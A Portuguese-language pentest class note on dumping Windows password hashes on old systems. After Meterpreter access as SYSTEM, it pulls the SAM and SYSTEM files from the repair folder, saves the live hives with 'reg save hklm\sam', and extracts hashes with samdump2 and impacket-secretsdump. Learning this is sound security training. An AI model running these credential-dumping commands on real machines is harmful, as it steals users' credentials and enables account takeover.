<h1 align="center"> Obtendo hashes em sistemas antigos do Windows</h1>
<hr>

Se ja tivermos acesso ao sistema com `meterpreter` usando o Metasploit podemos dar o seguinte comando para obtermos o hashes dos usuarios

```sh
meterpreter>hashdump
```

Mas oque a gente quer eh entender como que funciona todo esse processo , e se nao tivessemos o meterpreter? como a gente faz para conseguir esses hashes na maquina , vamos seguir oque a gente viu na aula passada.

Primeira coisa , vamos ver onde estamos no sistema e qual nossa permissao:

```
meterpreter>pwd
C:\Windows\system32

getuid
Server username: AUTORIDADE NT\SYSTEM
```

Vamos ate o diretorio config

```sh
meterpreter>cd config
meterpreter>dir
```

Se tentarmos baixar o arquivo SAM , veja que nos retornara um erro dizendo que nao podemos acessa-lo em execucao do sistema.

Entao como eh um sistema mais antigo , podemos acessar um outro diretorio:

```sh
meterpreter>pwd
C:\Windows

meterpreter>cd repair
meterpreter>pwd
C:\Windows\repair
meterpreter>dir
```

Lembrando que esse diretorio so existe em sistemas mais antigos , em sistemas recentes ele nao existe.

Entao neste diretorio `repair` vai conter o arquivo <span style='color:var(--mk-color-teal)'>SAM</span> , <span style='color:var(--mk-color-teal)'>System</span> na qual  a gente consegue baixar 😀

```sh
meterpreter> download sam
meterpreter> download system
```

Uma vez que a gente baixou os dois arquivos , podemos usar o software `samdump2`, esse software funciona so pra versoes antigas do Windows (Windows 2k/NT/XP/Vista).

Uma vez conhecido , podemos fazer:

```sh
meterpreter>samdump2 system sam
```

Feito isso nos trara os hashes,
Notem que eles nos traz alguns usuarios diferentes do hashdump do metasploit , isso porque nesse caso o backup que a gente conseguiu por conta de ser do `repair` nao estar atualiazado , ele nao eh um backup atualizado, dessa forma nao conseguimos obter a todos os usuarios do sistema e sim dos usuarios de quando o sistema foi gerado.

Como resolver esse problema entao ? poderiamos pegar uma shell diretorio naquele sistema e tentar utilizar o `reg` na qual a gente pode fazer consulta no registro do windows  , esse utilitario importantissimo contem varias funcoes , uma delas seria pra gente tentar capturar o <span style='color:var(--mk-color-teal)'>SAM</span> e o <span style='color:var(--mk-color-teal)'>System</span> direto do registro do Windows

```sh
C:\Windows\repair>cd .. ..
C:> reg /?
C:>reg save hklm\sam samOK
C:>reg save hklm\system systemOK
exit ;; para voltar ao meterpreter
```

Dai agora eh so a gente baixar o samOK e o systemOK:
```sh
meterpreter> download samOK
meterpreter> download systemOK
```

 Entao usamos denovo o samdum2 e notem a diferenca:
 ```sh
 samdump2 systemOK samOK
```

### Impacket

Um outro programa que a gente pode utilizar vem no pacote do impacket

```sh
impacket-secretsdump -sam samOK -system systemOK LOCAL
```

